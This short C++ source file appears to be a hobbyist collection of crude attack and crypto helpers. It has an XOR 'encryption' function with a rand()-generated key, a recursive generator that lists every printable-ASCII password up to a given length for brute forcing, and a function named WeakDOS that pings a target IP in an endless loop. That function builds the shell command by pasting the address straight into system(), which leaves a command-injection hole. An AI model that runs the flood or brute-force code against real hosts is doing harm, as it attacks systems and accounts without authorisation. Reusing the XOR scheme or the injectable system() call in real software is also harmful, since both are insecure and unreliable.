#include <iostream>
#include <vector>
#include <cstdlib>
using namespace std;


inline string XOREncrypt(string  encryptee, string key)
{
	for (int x = 0; x < encryptee.length(); x++)
	{

		encryptee[x] = encryptee[x] ^ key[x];//Encryption magic happens here!
	}
	return encryptee;
}


inline string GenerateBasicKey(string  encryptee)
{
	string alphanum = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	string key = "";
	//create a random key for it.
	for (int i = 0, randome = 0; i < encryptee.length(); i++) {
		randome = rand() % (alphanum.length() - 1);
		key += alphanum[randome];
	}
	return key;
}



inline vector<string> GenerateBrutePasswordVector(string tempPass, int length)
{
	vector<string> temp{};
	vector<string> place{};
	string holder = "";

	if (tempPass.length() >= length)
	{
		return place;
	}
	else
	{
		for (int k = 32; k < 127; k++)
		{
			holder += char(k);
			temp.push_back(tempPass+holder);
			place = GenerateBrutePasswordVector(tempPass + holder, length);
			temp.insert(temp.end(), place.begin(), place.end());
			holder = "";
		}

		return temp;
	
	}



}
inline vector<string> GenerateBrutePasswordList(int passwordLength)
{

	return GenerateBrutePasswordVector("", passwordLength);
}


inline void WeakDOS(string IPV4Address)
{
	while (true)
	{
		std::string IP(IPV4Address);
		std::string CMD("ping " + IP);
		std::system(CMD.c_str());
	}
}


